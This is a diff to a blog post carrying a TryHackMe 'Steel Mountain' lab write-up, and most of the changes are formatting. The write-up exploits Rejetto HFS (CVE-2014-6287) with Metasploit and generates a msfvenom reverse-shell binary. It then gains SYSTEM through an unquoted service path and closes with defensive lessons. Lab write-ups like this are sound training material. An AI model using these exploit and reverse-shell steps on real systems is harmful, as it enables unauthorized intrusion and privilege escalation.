@@ -1,27 +1,33 @@
 ---
-layout: post
 title: "Steel Mountain — TryHackMe Write-up"
-date: 2026-08-24
-categories: tryhackme writeup windows
+date: 2026-08-24 00:00:00 +0530
+categories: [TryHackMe]
+tags: [steelmountain, privesc]
+image:
+  path: /assets/images/steel-mountain/banner.jpg
+  alt: Steel Mountain
 ---
 
 Welcome folks! This is a write-up for **Steel Mountain**, a free room on TryHackMe.
 
 Room link: [tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)
 
-> **Disclaimer:** No flags (user/root) are shown in this write-up, so follow along and grab them yourself!
+> No flags (user/root) are shown in this write-up, so follow the procedures to grab the flags yourself!
+{: .prompt-info }
 
 ## Task 1: Introduction
 
 Before running an nmap scan, let's visit the given IP on the default port 80 and see what's there.
 
-![Steel Mountain homepage]({{ '/assets/images/steel-mountain/homepage.png' | relative_url }})
+![Steel Mountain homepage](/assets/images/steel-mountain/homepage.png)
 
 We see an image of an "Employee of the Month." Checking the page source shows the image filename gives away the name.
 
-![Page source showing image filename]({{ '/assets/images/steel-mountain/source-code.png' | relative_url }})
+![Page source showing image filename](/assets/images/steel-mountain/source-code.png)
 
-**Who is the employee of the month?**
+> Who is the employee of the month?
+{: .prompt-tip }
+
 Answer: `Bill Harper`
 
 ## Task 2: Initial Access
@@ -95,15 +101,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Apr 19 03:47:30 2023 -- 1 IP address (1 host up) scanned in 474.46 seconds
 ```
 
-**Scan the machine with nmap. What is the other port running a web server on?**
+> Scan the machine with nmap. What is the other port running a web server on?
+{: .prompt-tip }
+
 Answer: `8080`
 
 Port 8080 is running an HTTP server called HFS. Visiting it shows it's HttpFileServer 2.3 (HFS) — specifically **Rejetto HTTP File Server**.
 
-![HFS server info page]({{ '/assets/images/steel-mountain/hfs-server-info.png' | relative_url }})
-![Rejetto HFS homepage]({{ '/assets/images/steel-mountain/rejetto-hfs.png' | relative_url }})
+![HFS server info page](/assets/images/steel-mountain/hfs-server-info.png)
+![Rejetto HFS homepage](/assets/images/steel-mountain/rejetto-hfs.png)
 
-**Take a look at the other web server. What file server is running?**
+> Take a look at the other web server. What file server is running?
+{: .prompt-tip }
+
 Answer: `Rejetto HTTP File Server`
 
 Searching searchsploit confirms this version of HFS is vulnerable, with several exploits available:
@@ -113,11 +123,13 @@ searchsploit rejetto hfs
 ```
 
 <!-- TODO: searchsploit screenshot not found in assets/images/steel-mountain/ yet — add the file and uncomment:
-![searchsploit results]({{ '/assets/images/steel-mountain/searchsploit.png' | relative_url }}) -->
+![searchsploit results](/assets/images/steel-mountain/searchsploit.png) -->
 
 We'll use the Metasploit RCE exploit. Checking exploit-db gives the CVE number.
 
-**What is the CVE number to exploit this file server?**
+> What is the CVE number to exploit this file server?
+{: .prompt-tip }
+
 Answer: `2014-6287`
 
 ### Exploiting with Metasploit
@@ -128,7 +140,7 @@ Fire up Metasploit and search for the Rejetto HTTP File Server module:
 msf6 > search Rejetto HTTP file server
 ```
 
-![metasploit module search]({{ '/assets/images/steel-mountain/msf-search.png' | relative_url }})
+![metasploit module search](/assets/images/steel-mountain/msf-search.png)
 
 Set the options and run it:
 
@@ -152,13 +164,19 @@ meterpreter > getuid
 Server username: STEELMOUNTAIN\bill
 ```
 
+![Exploit run — session opened as STEELMOUNTAIN\bill](/assets/images/steel-mountain/exploit-run.png)
+
 We land a Meterpreter session as `STEELMOUNTAIN\bill`. The user flag is at `C:\Users\bill\Desktop\user.txt`:
 
 ```
 meterpreter > cat user.txt
 ```
 
-**Use Metasploit to get an initial shell. What is the user flag?**
+![user.txt flag (redacted)](/assets/images/steel-mountain/user-flag.png)
+
+> Use Metasploit to get an initial shell. What is the user flag?
+{: .prompt-tip }
+
 Answer: *(redacted — grab it yourself!)*
 
 ## Task 3: Privilege Escalation
@@ -175,8 +193,8 @@ PS > . .\PowerUp.ps1
 PS > Invoke-AllChecks
 ```
 
-![PowerUp upload]({{ '/assets/images/steel-mountain/powerup-upload.png' | relative_url }})
-![Invoke-AllChecks output]({{ '/assets/images/steel-mountain/invoke-allchecks.png' | relative_url }})
+![PowerUp upload](/assets/images/steel-mountain/powerup-upload.png)
+![Invoke-AllChecks output](/assets/images/steel-mountain/invoke-allchecks.png)
 
 One result stands out — an **unquoted service path** with `CanRestart: True`:
 
@@ -191,7 +209,7 @@ Name            : AdvancedSystemCareService9
 Check           : Unquoted Service Paths
 ```
 
-![Unquoted service path with CanRestart true]({{ '/assets/images/steel-mountain/unquoted-service-path.png' | relative_url }})
+![Unquoted service path with CanRestart true](/assets/images/steel-mountain/unquoted-service-path.png)
 
 An unquoted service path with a space in it (`...\Advanced SystemCare\ASCService.exe`) gets interpreted left to right, trying `.exe` at each whitespace boundary. Since we're `bill`, and `bill` has write access to `C:\Program Files (x86)\IObit`, and the service can be restarted — we can drop a binary named `Advanced.exe` in that folder, and when the service (running as `LocalSystem`) restarts, Windows will execute `Advanced.exe` before ever reaching `ASCService.exe`.
 
@@ -205,7 +223,7 @@ C:\Program Files (x86)\IObit\Advanced SystemCare STEELMOUNTAIN\bill:(I)(OI)(CI)(
 ...
 ```
 
-![icacls permissions output]({{ '/assets/images/steel-mountain/icacls.png' | relative_url }})
+![icacls permissions output](/assets/images/steel-mountain/icacls.png)
 
 ### Building and dropping the payload
 
@@ -215,13 +233,15 @@ Generate a reverse shell payload named `Advanced.exe`:
 msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe
 ```
 
+![Generating Advanced.exe with msfvenom](/assets/images/steel-mountain/msfvenom.png)
+
 Upload it through the existing Meterpreter session:
 
 ```
 meterpreter > upload Advanced.exe
 ```
 
-![uploading Advanced.exe]({{ '/assets/images/steel-mountain/upload-advanced-exe.png' | relative_url }})
+![uploading Advanced.exe](/assets/images/steel-mountain/upload-advanced-exe.png)
 
 Start a listener on the attacker box:
 
@@ -238,7 +258,7 @@ C:\> copy Advanced.exe "C:\Program Files (x86)\IObit"
 C:\> sc start AdvancedSystemCareService9
 ```
 
-![copying Advanced.exe into IObit folder]({{ '/assets/images/steel-mountain/copy-advanced.png' | relative_url }})
+![copying Advanced.exe into IObit folder](/assets/images/steel-mountain/copy-advanced.png)
 
 As soon as the service starts, `Advanced.exe` fires and a shell connects back on the Netcat listener as `NT AUTHORITY\SYSTEM` / Administrator context. From there, grab the root flag on the Administrator's Desktop:
 
@@ -252,12 +272,16 @@ C:\Users\Administrator\Desktop>dir
 C:\Users\Administrator\Desktop>type root.txt
 ```
 
-![root flag directory listing]({{ '/assets/images/steel-mountain/root-flag.png' | relative_url }})
+![root flag directory listing](/assets/images/steel-mountain/root-flag.png)
 
-**Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?**
+> Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
+{: .prompt-tip }
+
 Answer: `AdvancedSystemCareService9`
 
-**What is the root flag?**
+> What is the root flag?
+{: .prompt-tip }
+
 Answer: *(redacted — grab it yourself!)*
 
 ## Lessons learned
@@ -265,6 +289,3 @@ Answer: *(redacted — grab it yourself!)*
 - Outdated, unpatched software (Rejetto HFS 2.3) exposed on the network is an easy initial foothold — always check `searchsploit`/exploit-db for a service's version.
 - Unquoted service paths combined with writable directories and service-restart rights are a classic and very practical Windows privesc vector — `PowerUp.ps1` (or `winPEAS`) makes these fast to spot.
 - Least-privilege matters: `bill` never should have had write access to a directory backing a `LocalSystem` service.
-
----
-This post is licensed under CC BY 4.0 by the author.
